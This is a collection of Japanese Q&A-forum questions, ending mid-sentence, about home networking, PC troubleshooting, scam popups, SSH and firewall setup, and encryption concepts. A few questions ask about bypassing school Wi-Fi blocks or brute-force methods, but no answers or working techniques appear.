Win VISTA（DynaBook）です、宜しくお願いします。 Local接続で無線ルーター（中継機）の設定をして終わり、その後インターネット接続に切替 えましたが、インターネットに繋がらなくなりました。 「問題点の修復」とかを何度試しても駄目で、無線アダプターもアンインストール後に 再インストールしてやったり、「IntenetExploreの設定のリセット」も試しましたが、 全く駄目です。 IPを確認すると、ルーター（DHCPサーバー）から取っており、他のPC（無線（親機）に接続） と同じセグメントを表示しています。 （PC～アダプター～インターネット）では、（アダプター～インターネット）のみが×表示に なっています。 「ネットワークの共有センター」をみると「ワイヤレスネットワーク接続」には室内に飛んでい る無線のSSIDも表示しています。 システムの復元も試そうとしましたが、全く復元ポイントも作成してなくて、困っています。 最後はやはり工場出荷時に戻すしかないのでしょうか。 以上宜しくお願いします。
下の質問 https://oshiete.goo.ne.jp/qa/8934218.html から、Vista以降はパスワード付きZIPは無いようです。代替手段は用意されているのですか。 ネット上の自分のファイルの「公開URL」を相手に教えたいのですが、無関係の人がその公開URLを知ってしまった場合の保護策として使いたいです。 なお、添付ファイルにすると良いことは知っています。
父の所有物であるパソコンを家族で共用していました。家族はインターネットをするくらいです。先日、父が亡くなってしまい、しばらく、そのままパソコンを使っていましたが、 「safariが予期しない理由で終了しました。アプリケーションを再度開く場合は、“再度開く”をクリックして下さい。このレポートは自動的にアップルに送信されます。」と表示され、インターネットが使えなくなりました。種類はMac OS Xバージョン10.6.8 です。何をしたら、使えるようになりますか？また機械が苦手な私たち家族だけで直せますでしょうか？詳しい方、教えて下さい。よろしくお願いいたします。
ネット上の或るパスワード生成器には、 　記号を使う／使わない の選択肢があり、”使う”方が強度が高いそうです。 何故でしょうか。文字コードの立場からは、記号も数字や英文字も同じ一バイトの数字だと思います。 あと、ZIPファイルにパスワードを付けても、解読される可能性が高いそうです。根拠は知りませんが、Windowsで正式に採用されているのに信頼できないのでしょうか。また、代替手段はありますか。
2週間前にＮＥＣのＬavie Tab PC-TE508S1Wを購入、早速Ｗｉーｆｉに接続してヤフーもＹｏｕＴｕｂｅも観ることが出来たのですが、ここ1週間位接続状態がいのか繋がらない日が何日かあります。 今日も朝から全く繋がらない状態です。メールの送受信もできません。　 設定画面のＷＬＡＮの状態を見るとＣＧ－Ｇuestは接続済みが表示されています。 ネット環境はヤフーＢＢのＡＤＳＬ８メガタイプ、ルーターはコレガのＣＧＷＬＲＧＮＸです。 タブレットのホーム画面からＹｏｕｔｕｂｅをタップしても再試行が表示されるだけです。Ｇｏｏｇｌｅでヤフーを検索するとページが見つかりませんでした、が表示されます。 ノートＰＣは何の問題も無いのですが。 解決策よろしくお願いします。
学校にはwifiが飛んでいるのですがwifiのブロックを突破する方法を教えてください 具体的には オンラインゲームができない マルチができない ニコニコが見れない などです 具体的な突破方法を教えてください パソコンではなくスマホで突破したいです
アクティブディレクトリ環境ですが、クライアントから各サーバーにアクセスするとき、ホスト名だとすぐ繋がるのに、ipアドレスだと10秒程度フリーズしてから繋がります。 どのようなことが考えられるでしょうか。 すべてのパソコン、サーバーで発生し、SMBやHTTPなど基本的なプロトコル、ポート全てで発生します。
税理士試験４科目合格者の４１歳男性です。 会計事務所や会社経理で働きながらの受験で、４科目合格（簿、財、相、法）までに十数年かかっています。 絶対に5科目合格するという決意はあります。 最終科目に所得税法を勉強していますが、最終科目で所得税法を合格された方に質問です。 総合計算問題は何問を何回反復させましたでしょうか。 私はTACと大原の総合計算問題（基礎と応用）の全３４問を現在３回目です。 答えを覚えている故か、殆どノ－ミスでほぼ満点解答できます。 計算公式は、ほぼ完ぺきに覚えています。 しかし、過去問や本試験の計算では、正解ができない異質の難しさを感じ、果たして資格学校の問題集で太刀打ちできるのか最近懸念しています。 ちなみに今まで所得税法だけで３回不合格です。（H24,H25,H26） 本試験の計算問題を克服する手法と心構えを教えて下さい。（理論の勉強方法は結構です。） よろしくお願い致します。
gmail職場で利用しています。よく受信する相手からは、重要度が付きます。また、よく受信する相手に返信する際も重要度が付きます。しかし、よく受信する特定の相手に対して、こちらから最初にメール送信した場合、送信重要度が付きません。こちらから最初にその特定の相手にメール送信したにもかかわらず、このケースは何度もあります。なぜ、重要度が付かないのでしょうか。日ごろから相手が私のメールを重要とみていないのでしょうか？
Sambaで共有サーバーを作りたいと思っています．使用OSはCentOSの予定です． 諸事情により，ネットワーク内が完全には使用できないため，クライアントとファイルサーバーの通信データを暗号化したものを構築しようとしています． ネット上で調べたところSamba over SSHというものが見つかり，OpenSSHを使えばいいのかな と思ったのですが，似たようなものでSambaをOpenVPN内で使うというものも見つかり， 何が違うのかなぁと疑問に思っています． どちらも通信を暗号化してくれそうですが，何が違うのでしょうか？ よろしくお願いします．
B社製の無線ルーターの設定をしました。 取説を読むと、「LAN側のIPアドレスは（192.168.11.1）と書いてあり、PCに同じセグメントのIP を設定してから、無線ルーターの設定を行う。」とあります。 今、（モデム（ルーター機能有り）⇒無線ルーター（ルーター機能停止）⇒PC）という構成にして、 無線ルーター、PCのIP（複数）をみると、（192.168.0. XXX）となっています。 ここで疑問ですが、 ①無線ルーターのWAN側のIP（モデム⇒無線ルーター間）はどのようなIPがふられている のでしょうか。 ②（192.168.11.1）というのは、どのような意味を持つのでしょうか。 無線ルーターを最初に設定（設定画面にアクセス？）するためだけのIPなのでしょうか。 ③もし、（モデム（ルーター機能有り）⇒無線ルーター（ルーター機能停止）⇒無線中継機 （ルーター機能停止）⇒PC）という構成にした場合には、無線中継機、PCはどのようなIPに なるのでしょうか。 以上宜しくお願いします。
ワンクリック詐欺？で登録されましたって表示して、ほっとかなきゃいけないのに、誤って、間違って登録しましたって打ち込んで送ってしまいました。メールはiCloud.comです。これで、クレジットカードとかの番号はわかりませんよね？！
添付のような警告が出ますskype使っているわけではなくメールやブラウジングしているときに出たりします。あと目覚ましの時も出たり・・・ どうやって出ないようにしたらいいでしょうか教えてください
汎用サーバーにネットワークカメラを接続するのですが、そのサーバーがカメラ何台まで処理できるかを実験したいと考えています。 この場合、カメラを何十台も揃えられればいいわけなのですが、それも難しいので擬似的にカメラがはき出すストリーミング信号（データ）を生成する機械かソフト、手法がないか探しています。 データ自体は同じものの繰返しで問題ありません。 お詳しい方お知恵をお貸しください。
カテゴリを変えて質問させて頂きます。 入手した暗号化ファイル(※)を「ブルートフォースアタック」で解析する際の手法について教えてくださいm(_ _)m ※「パスワードを設定して暗号化/復号を行うソフト」から作られたものに限ります ①暗号化ファイルにはパスワードのハッシュ値が含まれていて、考えられる全てのパスワード (辞書の単語や文字列の組み合わせ)のハッシュ値とファイルのハッシュ値を比較という解析方法 をとっているのでしょうか？ ②パスワードではなく、暗号鍵自体の総当たりを行う場合はどのような手法で行うのですか？ 　(これもファイルに暗号鍵のハッシュが含まれていてそれを解析…という方法になるのですか) 　ユーザーは弱いパスワードを設定する事が多いので、攻撃者はパスワードを狙って解析する 　と思われますが、暗号鍵の解析の手法としてどのような方法が考えられるのか知りたいです。
こんにちは。 LENOVOの新品のノートパソコンを購入したのですが、 デスクトップに写真の家のような変なマークがあり、消えません。 壁紙を変更しても消えず、また、上にエクセルとか、かぶせても 消えずで、困っております。 アイコンかなと思つて、クリックしたり、移動したりも 試したのですが、動きません。 こちら、何か分かりますか？ 消す方法を教えていただければと思います。
このページは危険性が強まります。等とかかれたページに間違ってアクセスしてしまいました。 聞いたことがある話では勝手に買い物されたりとかお金が抜き取られるとかいったことをよく聞きますがそういうのにアクセスしてしまったら私もそうなってしまうんですかね… Amazonとかに残高が沢山残っているのでとても不安です。 どうすればいいでしょうか。　 長文失礼いたしました。
こんにちは。数日前に気付いたのですが、自分のフリーアドレスを何気なく googleとyahooで検索したら、一番上に、一年程前にあるサイトで登録した趣味仲間募集の プロフィールが出てきました。このプロフィールは数日だけ公開して すぐにサイト内で停止していました。 このようなプロフィールが検索すると出てくるなんて… しかも一番上に出てきていました。 とてもプライベートな内容ですし、サイト内だけで閲覧されるのも恥ずかしいぐらい だったのでショックです。 何故このようなことがおこってしまったのでしょうか。 すぐにそのサイトは退会しアドレスも止め、 マイクロソフトの簡易ウイルスソフトを入れていましたが すぐに、ウイルスバスターを入れました。 誰かが悪意を持って、なにか操作をしたのでしょうか。 とても不安になってしまいました。
入手した暗号化ファイル(※)を「ブルートフォースアタック」で解析する際の手法について教えてくださいm(_ _)m ※「パスワードを設定して暗号化/復号を行う暗号化ソフト」から作られたファイルに限ります ①(暗号化ファイルでなく)普通のパスワードがかかってあるファイルを解析する場合は、 　考えられる全てのパスワード(辞書の単語や文字列の組み合わせ)のハッシュ値を計算し、 　ファイルに含まれているハッシュ値と照合するという手法を取っていると思います。 　パスワードを用いた暗号化ファイルの場合も、上記と同じですか？ 　(暗号化ファイルにはパスワードのハッシュ値が含まれている) ②パスワードではなく、暗号鍵自体の総当たりを行う場合はどのような手法で行うのですか？ 　(これもファイルに暗号鍵のハッシュが含まれていてそれを解析…という方法になるのですか) 　ユーザーは弱いパスワードを設定する事が多いので、攻撃者はパスワードを狙って解析する 　と思われますが、暗号鍵の解析の手法としてどのような方法が考えられるのか知りたいです。
PCを起動しようとしたらBIOSが起動しませんでした。なのでマザーボードの豆電池を取り替えました すると普通にWindowも起動したのですが、起動してからweb上でSSLが使用できない。 安全性を確認できない。と出てきて買い物やログイン等ができません。twitterも携帯？のような画面で操作ができません。 いじったのはBIOSですのでBIOSの初期化をしてみましたが直りません。 他に思い当たる部分はネット環境とセキュリティー環境なのですが、特に変化もしていません。 思い当たることがあったら教えていただきたいです。お願いします。 画像は左がどこかのサイトに飛ぶ時です。Gmailなど 右はtwitterログイン画面（だと思います）です。
linux OS上でopensslを使ったサーバとクライアントをプログラミング開発しています。 SSLなので、はじめに共通鍵を公開鍵方式により受け渡すと思います。 この共通鍵の暗号化方式にはAESやDESやCamelliaなどいろいろあると 思いますが、この暗号化方式を自由に選択することはできるのでしょうか？ （プログラミングで選択可能？それともopensslコマンドで選択可能？）
会社でネットワークの部署に移動しました。 PCのハードスキルはありますが、ネットワークスキルは皆無です。 まずはどこから手を付けて勉強すればよろしいでしょうか。
迷惑メールを受信拒否やルール仕訳で差出人が次の場合や次の文字を含む場合などにチェックして次からは迷惑メールへ実行としてもくぐり抜けて来て普通に受信ボックスに入るのは何故ですか？ また、どうしたら目にすることなく迷惑メール行きにできますか？ 毎日、腹を立てながら手動で迷惑メールへ送っています。
現在プライベートでブログを書いていますが、instagramにUPした画像をブログに使うことがあります。 そこで少し気になったことがあります。 ①instagramにUPした画像を画像検索してブログに辿り着くことはありますか？ ②逆にブログの画像を画像検索してinstagramに辿り着くことはありますか？ わざわざ人のinstaやブログの画像を画像検索をする人なんていないとは思うのですが、instaとブログが結びつくのは避けたいもので..特に①は困ります。 おわかりになるかたがいらっしゃいましたら教えていただけないでしょうか。 よろしくおねがいいたします。
アマゾンで、自分で出品した商品を、自分で買いたいのですが、同一人物の仕業とはアマゾンにばれたくありません。大学にパソコンがたくさんあり、パソコンごとに別アカウントで自分の商品を買うことは可能です。 しかし、学校のパソコンを使うには、最初に学校が配布したアカウントを入力してパソコンに入らなければいけません。このため、別パソコンで別アカウントで買い物しても、同じ人物が成りすまして自分の商品を買っているとばれる可能性はありますか？
家のネットワークで、 ルータ(192.168.1.1) ｜ ハブ－PCa[win7](192.168.1.3)(192.168.2.1) ｜ PCb[win7](192.168.2.3) があります。 PCbがdhcpでアドレスを取得しているのですが、 PCbのデフォルトゲートがなぜかPCaになっています。 しかもルーターの第3オクテットと違うIPを取得してきます。 そして、外部にtracertをうつと、PCa経由で出て行きます。 なぜかPCaがルーター？の役目のような状態になっています。 PCaにはそのようなソフトはなさそうなのですが、 何か原因はありますでしょうか？
SCRAM についてのRFCを見ていたら、 中間者攻撃の話が書いてありました。（ハッシュ値を総当り的に計算して辞書を作っておくなど） 通信経路の途中に割り込んで、盗聴していろいろ悪さをすること。 だと思うのですが、少し疑問が浮かびました。 それは、次の項目です。 １．中間者攻撃に使う機材はどんなものがあるのだろうか？ ２．機材の値段はいくらかな？（パラボラアンテナとか、けっこう高そうです。） ３．本来の発信者から、本来の受信者までの通信経路を考えると、 　　途中のサーバーの中への攻撃を、中間者攻撃と言わない理由は何かな？ ４．中間者攻撃による被害で有名なものは何かな？ ５．サーバーへの攻撃によるデータ流出の話題が時々出ますが、 　　中間者攻撃による被害の話題は聞いたことが無いが、実際は、かなり多いのかな？ 以上、お暇なときにでも、教えていただければ幸いです。 よろしくお願いします。
現在スマートフォンがソフトバンクで家のインターネットがNTT西日本です。両方ともwifiスポットの契約をしてますが、どれもセキュリティの内容がよく分かりません。特に一番気になるのがsoftbank0001です。スーパーや食事等人が集まる所へ行くとどこでもと言っていいほど良く繋がります。softbankのサイトでは安全性を強調してますがスマホをタップして見るとセキュリティなしと書いてあります。一番繋がるのがsoftbank0001だけに不安です。リスクや危険性など詳しい方教えて下さい。よろしくお願いします。
・SSL ClientHelloの歳、httpプロトコルヘッダのUAはサーバに送信されますでしょうか？ ・上記がYesの場合、iphone、iモードブラウザでは、UAはサーバに送信されますでしょうか？ （質問背景） SSL通信を確立する前に端末種別を把握する必要があり、質問させていただきました。 有識者の方どうぞよろしくお願いします。
　最近ウインドーズーパートナーズと言う名前で貴方のPCは故障する寸前です。早く修復してくださいとメッセージが届きますが信用できるのですか何方か教えて下さい」。
SMTP-AUTH での接続のときに、 DIGEST-MD5 は、使わない方が良いのでしょうか？ 参考；　RFC6331 Internet Engineering Task Force (IETF) A. Melnikov Request for Comments: 6331 Isode Limited Obsoletes: 2831 July 2011 Category: Informational ISSN: 2070-1721 Moving DIGEST-MD5 to Historic Abstract This memo describes problems with the DIGEST-MD5 Simple Authentication and Security Layer (SASL) mechanism as specified in RFC 2831. It marks DIGEST-MD5 as OBSOLETE in the IANA Registry of SASL mechanisms and moves RFC 2831 to Historic status.
パソコン初心者です。 教えてください。 ノートパソコンにおいて、 「1つのマルウェアの感染が発見されました。 Advanced System Protectorを至急削除してください。」 との表示が出ました。 表示の意味が分からなかったのですが、 ネットで調べると下記のサイトにたどりつきました。 http://www.geocities.co.jp/Playtown-Yoyo/6130/no … そして、すぐにAdvanced Systen Protector と　RegClean Proを アンインストールしました。 質問ですが、今回の感染のマルウェアについて マルウェア＝Advanced System Protectorという 認識はあっていますでしょうか？ また、アンインストールしたため、 これでマルウェアは削除されたということになりますでしょうか？ とりあえず、感染したパソコンはネットにつながない方が良いとあったので、 ネットにつないでいません。 これで感染が削除されたのであれば、 またネットにつなぎたいと思っています。 また、パソコンの保護にはマイクロソフト社が無料提供している Microsoft Security Essentialsを使用していますが、 ウィルスバスターやノートンなどの有料のセキュリティーソフトを購入した方が良いのでしょうか？ 稚拙な文章で申し訳ございません。 色々調べましたが、なかなかついていけず・・。 アドバイスなどいただけると幸いです。 よろしくお願い致します。
私の友達なんですが、今年の1月5日辺りから アメーバのピグを第三者に操られています。 誰にもPWも教えていないのに、勝手に顔を変えられたり、友達を削除されたり、友達が入れてくれているコメントや、自分が友達に入れたコメントを、決まったピグ友さんだけ、同じ時間帯に削除されているのです。 PWを何回も変更しても全く駄目で、アメーバに問い合わせしても無回答。 オンラインゲームの消費者センターに問い合わせしたら、サイバーエージェントに問い合わせをしてくれるとの事でしたが、未だ回答無の 状態です。 何か、本人として阻止する方法などありませんか？ 私も色々調べてみるのですが、操作してる相手の特定なんて、出来る訳ありません。 どうか、友達を助ける方法を教えて下さい。 因みに、サイバー警察にも問い合わせ済みです。
グローバルIPとプライベートIPの見分け方を教えて下さい。 グローバルIPとプライベートIPのそれぞれのクラスは下表になりますが、 例えば「10.172.14.30」はグローバルIP、プライベートIPのどちらになりますか？ 私の理解としては、グローバルIPとプライベートIPのクラスAとは、 下記の範囲に収まることを意味すると考えています。 従って「10.172.14.30」はどちらの範囲にも収まってしまうため、 グローバルIPなのか、プライベートIPなのか判断できません。 グローバルIP　クラスA 第1オクテットが0～127の範囲　第2オクテットが0～255の範囲 第3オクテットが0～255の範囲　第4オクテットが0～255の範囲 プライベートIP クラスA 第1オクテットが10～10の範囲　第2オクテットが0～255の範囲 第3オクテットが0～255の範囲　第4オクテットが0～255の範囲 表：グローバルIP A　0.0.0.0～127.255.255.255 B　128.0.0.0～191.255.255.255 C　192.0.0.0～223.255.255.255 表：プライベートIP A　10.0.0.0～10.255.255.255 B　172.16.0.0～172.31.255.255 C　192.168.0.0～192.168.255.255
　ネットワークの初心者です、宜しくお願いします。 　家庭内で複数のPCをLANでネットワークを組んでいます。 　現在電源の入っている各PCのIPアドレスを１台のPCから確認できる方法が あれば教えてください。 　宜しくお願いします。
Instagramのセキュリティコードが届きません。困ってます。 国際SMSを拒否しているんでは？と皆さん回答してますけど、肝心の設定方法が見つかりません。できれば、わかりやすく教えていただけると有り難いです。よろしくお願いします。
システムの復元が出来なくなりました。メールも開けなくなりました。yahooのページも開けなくなりました。コントロールパネルで回復をクリックしても反応がありません。どうすればいいのでしょうか？わかる人教えてください。
昨日、ネットカフェでインターネットを利用していました。が、あるサイトにアクセスしようとしたところ、画面上に、「ＡｃｔｉｖｅＸコントロールを有効にしますか？」とのスクリプトが表示され、尚かつ、「全てのサイトにて有効にしますか？」という表示もありました。 自分はすぐにそのサイトにいきたかったので、「全てのサイトにて有効にする」にチェックを入れ、OKをクリックしてアクセスしましたが、後になってそのActive　Xという得体の知れないソフト？が気になったので、調べてみると、有効にするとセキュリティ面において問題がある、との事でした。もしもウイルスに侵されたら、と心配になり、直ちにそのネットカフェで問い合わせたところ、退店後の再起動と、セキュリティソフトは導入は行っているそうなので、すこし落着きました。が、ウイルスに侵される危険性と、もしもウイルスに侵されてPCが駄目になってしまった場合、賠償責任は自分が負うのか、すごく不安です。恐れ入りますが、ウイルス感染可能性と賠償責任の有無について、どなたかお答え頂ける方、ご回答お待ちしております。
するには、どうすれば良いでしょうか？ ftpだと次のようなことがエクスプローラで出来ていました。 そのやり方を知った当初は、ファイル共有にも利用出来ていました。 クライアントのアカウントには、サーバ上には低いアクセス権しかないアカウントだけを 用意し、下記の要領で file://ユーザ名@サーバ名/ でショートカットを作り、 そのショートカットを開く際にパスワード入力することで、利用出来ていました。 現在は、出来ないのでしょうか？ ※標準のFTPアクセス ftp://FTPサーバ名/ ※ユーザー名とパスワードを指定したFTPアクセス ftp://ユーザー名:パスワード@FTPサーバ名/
当方、実はウィルス対策ソフトは最も悪用されやすいソフトであるのではないかと考えています。 信頼性のある”ウィルス対策ソフト開発会社”はどの会社でしょうか？ よろしくお願いいたします。
自社内に設置されているWEBサーバに、自社と直接ネットワークで 接続していない他社のPCから接続して利用するために、 回線で接続したり、VPNを利用したりという手段をとらずに ルータの設定のみで可能な方法はあるでしょうか? その場合のリスクも併せてご教示頂けたら助かります。 私はネットワークに関しては無知に等しく、馬鹿げた質問をしている のかも知れないと思いつつ、質問させて頂きました。 どうぞ宜しくお願いします。
最近何もWi-Fiに接続していないのに、接続数が1になります。思い当たる節全てを通信OFFにしましたがそれでもなります。 バクなのでしょうか？それとも誰かに勝手に使われているのでしょうか？わかるかたいらっしゃいましたら、お教えください。機種はソフトバンクのC01HWです。
普段パソコンを使うとき、家族共有のパソコン（mac)を使っているのですが このまえ、facebookをそのパソコンで開いてから 友達からメッセージがくるたびにそのメッセージ内容が右上に表示されます 一度、偽のアカウントを作ってログインしたら 私のメッセージはこないんじゃないかと思い試みたのですが うまく反映されず、アプリ自体のサイトの履歴などを消しても何ら変化はありませんでした。 どうやったら、友達とのやり取りをみられぬように設定できますか？おしえてください
デザイナーなのでハッキングされたサイトが修復出来なくて困っております... Wordpressで作成したサイトが、Googleで検索すると、「このサイトは第三者によってハッキングされている可能性があります」と表示されるようになりました。 取りあえずGoogleウェブマスターツールで【セキュリティの問題】でスキャンしてみましたが問題無し、と出ます。 Googleで検索しまくり、site:〇〇.comで調べたところ、検索結果のディスクリプションにちらほら怪しい欧文が表示されました。 ターミナルシェルでcURLでもトップページを表示させると、ソースが書き換えられ、メタタグも怪しいものが混じっている事までは分かりました。 ただ、ウェブマスターツールでは問題無しと出てしまうため、どこが感染しているのか、(データベースを含め)、どこに脆弱性があるのか分かりません... こういった場合は、プロバイダに有償で直してもらうしかないでしょうか... あと、該当のサイトのサーバーはロリポップなので、ロリポップに問い合わせるべきでしょうか？(Googleではプロバイダに相談とありましたが...) 私は、HTMLコードは分かり、Wordpresで好きなデザインに構築することはできます。 MySQLは、クエリを打ち込む事くらいは出来ますが素人(orデザイナー)レベルです。 サーバなどの知識も素人(orデザイナー)レベルです。 よろしくお願いします。
セキュリティ無のwinPCをネットに繋げてしまったので、どうしたらよいか教えて下さい。 当方macユーザーで、winのことをまったく知らない素人です。 （macについても、使っているとはいえ全然くわしくなく、コンピューター全般に素人です。） 仕事上どうしてもwinPCを購入して設定をする必要があり、友人に頼んで最初の設定と、彼がおすすめする体験版ウイルス対策ソフト（ESET smart security）の体験版設定をしてもらいました。 （無料のじゃなくて、これを買え、と勧められたのでまず体験版を入れてもらった） その後しばらくPCを使う必要がなかったので、１ヶ月体験版が切れているのを忘れて放置してしまいました。 今日、そのことに気づいて、製品版の購入＆ダウンロードを、セキュリティの切れた状態でIEにつなぎ、クレジットカード決済をし、IDとパスワードの記載メールをgmailを立ち上げて確認してしまいました。 製品版のインストールは無事完了したようなのですが、この一連のインターネット上での行動を、セキュリティのない状態で行ったのはまずかったのでしょうか？ 今、調べたら「ネットにつないだ瞬間にウイルスに乗っ取られる」などの記事が出てきて、どうしたらよいのか途方にくれてしまっています。 大変なことをしてしまったのでしょうか？ 購入したESET smart securityでウィルススキャンをすると、特に問題がない、と表示されるのですが、ソフトをインストールする前にウイルスが入り、それらはもう検知できず水面下で感染して駆除できない、とかはありますか？ もう一度パソコンを初期化して、OSのインストールからやったほうがいいのでしょうか？ でもその場合も、セキュリティソフトをダウンロードする時に、IEにはつなぐので、同じことですよねぇ。。。。。 設定してくれた人も、そうやってネットからダウンロードしていたのですけれど。。。。 もう一点。 セキュリティ無しの状態で、製品版購入のためのクレジットカード決済をインターネット上でしたのはまずかったですか？ カード情報のスキミングや不正使用など起きたりするのでしょうか。。。 カードの停止もしたほうがよいですか？ とにかく、PCについてあまりに素人なので、今後何をしたらよいのか、何を注意したら良いのか、どなたかご指導願います。 どうぞよろしくお願い致します。
あるpcのオンラインゲームをしながらスマホのアプリのスカイプを使って会話をしていたのですが、相手に私の顔が見えているかのような発言をされました。 他にも、私はノートpcを使ってオンラインゲームをしているのですが、スカイプもカメラも使っていないのに他のプレーヤーから同様の発言をされたことがあります。 単なる思い込みかもしれませんが、どうしても気になってしまいカメラが怖くて常にシールを貼っている状態です。 乱文になってしまい申し訳ございません。 どなたか詳しい方、回答宜しくお願いします。
自分の画像や情報が載っているウェブページの削除って、検索してみてもよくわからなかったので、わかりやすく教えてください…！
自分のものではないので、よく分からないことが多いのですが教えていただきたいです。 できればそんなにパソコンに詳しくない初心者でも分かるようにご教授いただければありがたいです。 勤め先のＰＣについてなのですが、 ・インターネット接続はされている ・Google Chromeは開けて、検索もできる ・検索結果一覧も表示される ・でも検索結果のページを開こうとしたら、長い時間読み込み続けて開けないor表示できませんになる 簡単に問題を説明するとこんな感じになります。 ネット接続できているのは確認済みで、なぜネット接続できているし検索はできるのに検索結果のページが開けないのか全然わからないのです。 使えなくなったのは18日の木曜日からです。 最後に使えたのは16日の火曜日です。 Windows8　Internet Explorer 11 イーサネット 今分かるのはこのくらいなのですが、もし解決策があれば教えてください！
CentOS6.5において、こちらのサイトhttp://centossrv.com/iptables.shtml を参考にiptablesのスクリプトを作成しました。 いざ　sh iptables.shで実行しようとすると iptables: チェインをポリシー ACCEPT へ設定中filter [ OK ] iptables: ファイアウォールルールを消去中: [ OK ] iptables: モジュールを取り外し中: [ OK ] iptables: ファイアウォールルールを適用中: Bad argument `ACCEPT' Error occurred at line: 9 Try `iptables-restore -h' or 'iptables-restore --help' for more information. [失敗] と表示されます。 9行目付近は 1 #!/bin/bash 2 3 4 # デフォルトルール(以降のルールにマッチしなかった場合に適用するルール)設 定 5 IPTABLES_CONFIG=`mktemp` 6 echo "*filter" >> $IPTABLES_CONFIG 7 echo ":INPUT DROP [0:0]" >> $IPTABLES_CONFIG # 受信はすべて破棄 8 echo ":FORWARD DROP [0:0]" >> $IPTABLES_CONFIG # 通過はすべて破棄 9 echo ":OUTPUT ACCEPT [0:0]" >> $IPTABLES_CONFIG # 送信はすべて許可 10 echo ":ACCEPT_COUNTRY - [0:0]" >> $IPTABLES_CONFIG # 指定した国からのア> クセスを許可 11 echo ":DROP_COUNTRY - [0:0]" >> $IPTABLES_CONFIG # 指定した国からのア> クセスを破棄 12 echo ":LOG_PINGDEATH - [0:0]" >> $IPTABLES_CONFIG # Ping of Death攻撃は ログを記録して破棄 とサイトと同じ内容になっています。 空白など無駄なものが挿入されていないか確認しましたがありませんでした。 解決できるようどうかお力添えをお願いします。
オンプレミス環境やクラウドなど問わないのですが、 個別にサーバを構築し、そのサーバ間の疎通確認を行う方法として確認したいことがります。 各サーバ間は、送受信する通信ポートは一意に指定して、それ以外のポート、指定外のプロトコルでの通信は破棄するように設定します。 その通信設定した内容が問題ないか、テストとしてどんなことをされてるんでしょうか？ ICMPを許可していれば、ping試験ですが、TCPでの指定ポートのみの通信許可にしているので、不可かと思ってます。 設定例(1)　Aサーバ→BサーバへのTCP ポート1000番のみ通信OKにしている。 設定例(2)　Bサーバ→Aサーバは、レスポンスのみOKにしている といった感じになってます。 要点としては、 ポート指定して通信が通る確認の方法って何があり、どんな確認手段になりますでしょうか？ telnetのポートしてでの確認もできるみたいなことがWEBにありましたが、結果どうなれば良いかまで良くわからず。 また、通信ができない試験も必要かと思いますが、そちらについてもアドバイスをお願いします。 経験が浅いので申し訳ないですが、お知恵を貸していただければと思います。 よろしくお願いします。
パソコンの画面に時々、「Windowsは不正規品です」のメッセージがでます。 一番上には　＜Windows Activation Technologies＞と表記され、 画面右端には、＜ ask for genuine Microsoft softwre ＞のロゴのような物があります。 大体、「このコンピューターは正規品の　Windows　を表示していません」という意味が不明です。
タイトルの通りなのですが、特定のサイトの脆弱性を公開する事は罪になりますか? 勉強会やブログに悪い例として紹介したいと思ってます。 脆弱性といっても損害にならない放っておいてもいいもの(脆弱性とは言えないかもしれませんが)から、全データが消えかねない致命的なものまで幅広いのでどこまで紹介してよいのかわかりません。
以下環境です インターネット ┃ 自宅ルータ(Buffalo WZRシリーズ) ┃↑自宅ルータ Windows 8.1 タブレット ┃↓モバイルルーターもしくは公衆無線 HWD14(wi-fi モバイルルーター) ┃ インターネット Winタブより自宅ルータに接続する際は PC側のwi-fi設定でIPアドレスを固定(ipv4)してISPのDNSを指定して、 自宅ルータ側にもISPのDNSを指定しています。 ですが公衆無線LANの時やモバイルルーターを利用する際は PC側のwi-fi設定をIP自動取得にしないと正しく接続出来ません 都度設定を書き換えるのは非常に面倒です。 wi-fi設定が複数あれば使い分けられそうな気もするのですが 正しい設定はどの様にするべきでしょうか？ ちなみにモバイルルータの方はDHCP機能はありましたが固定機能はありませんでした。
SSHで外部から接続したいのですが、うまくできません。 接続するとユーザ名とパスワードを聞いてくるのですが、入力すると「認証に失敗しました.再試行してください」と表示されます。 現状を以下に記述します。 ・SSHサーバは、Raspberry PiのRaspbian ・接続するクライアントはWindows 7でTeratermを使用 ・通信機器のHGW(RT-500MI)には、TCP&UDPのポート22でIPマスカレード設定済み ・HGWのパケットフィルタは解除済み ・sshdは起動済みで、LAN内からSSH2で接続OK ・設定ファイル等はデフォルトのまま ・クライアントもデフォルト設定で、プレーンテキストでの接続を使用 ・LAN内からは問題なく接続可能 ・WANからグローバルIPに対して接続すると上記のエラーメッセージを表示 ・ユーザ名、パスワードはLAN内で接続確認できたものを使用 ・外部からのポートチェック(http://www.cman.jp/network/support/port.html)で22番ポートにアクセス可能 ・service ssh statusでrunningを確認 ・netstat -lnp | grep :22でLISTENを確認 あとは何かファイルを設定したり、確認項目はありますでしょうか。 お分かりになる方、お教えください。
最近買い換えた無線ルーターについてなんですが 当方、デスクトップとノートを所持しております。 デスクトップの方は、有線で繋いでるので問題はないのですが ノートの方を無線で繋ごうとすると、接続先にルーターの表示が出ません。 2.4GHzだと普通に表示されたのですが、5GHzにすると接続先が表示されないのです。 スマホは何とか接続することができました。 色々調べてみると、5GHzだと障害物に弱いとかってあり 多少高い位置に設置しました。 スマホが繋がるのに、何故ノートパソコンの方は接続先が表示されないのでしょうか。 windowsVista　です。
S/MIME　に関しての疑問です。 http://www.atmarkit.co.jp/fsecurity/special/04sm … において、次のように書かれています。 　S/MIMEでは、その仕組みにPKIを使っています。その点は、Webブラウザ～Webサーバ間の通信の暗号化、認証を行うSSLと同じですね。PKIを一言でいってしまうと、「認証局という第三者的機関が、公開鍵とその持ち主を保証する」です。その結果が、認証局が電子署名して発行した公開鍵証明書と呼ばれるデータです。認証局を商用のサービスとして提供している会社として、ベリサイン社などが有名です。ちなみに、ベリサイン社では公開鍵証明書のことをデジタルIDと呼んだりしています。PKIについての詳細はここでは省きますが、解説した記事が別にありますので、興味がある方はSecurity&Trustフォーラムを参照してください。 認証局という第三者的機関が、公開鍵とその持ち主を保証する」 の部分ですが、鍵に、その持ち主が山田太郎　だと書いてあったら、 ほんとに、その鍵の持ち主が山田太郎　だと言えるのでしょうか？ 調べてみたら、 http://www.jipdec.or.jp/esac/reliability/smimeTa … 個人対象の、証明書の発行では、 申込時の本人確認 行わない 申込時のメールアドレス確認 行う となっているところがほとんどでした。 本当は、川崎次郎　と言う人が Gメールのアドレスを　山田太郎と名乗って取得し そのアドレスを使って、山田太郎の名前の証明書を取得したら、 この証明書が、何を証明するのかが分かりません。 これは、S/MIME の方式の大きな欠点ではないでしょうか？ 改良案などありましたら、教えてください。 また、私が誤解しているてんなどが、ありましたら教えてください。 なお、偽名の証明書は、無料で発行してくれる所から 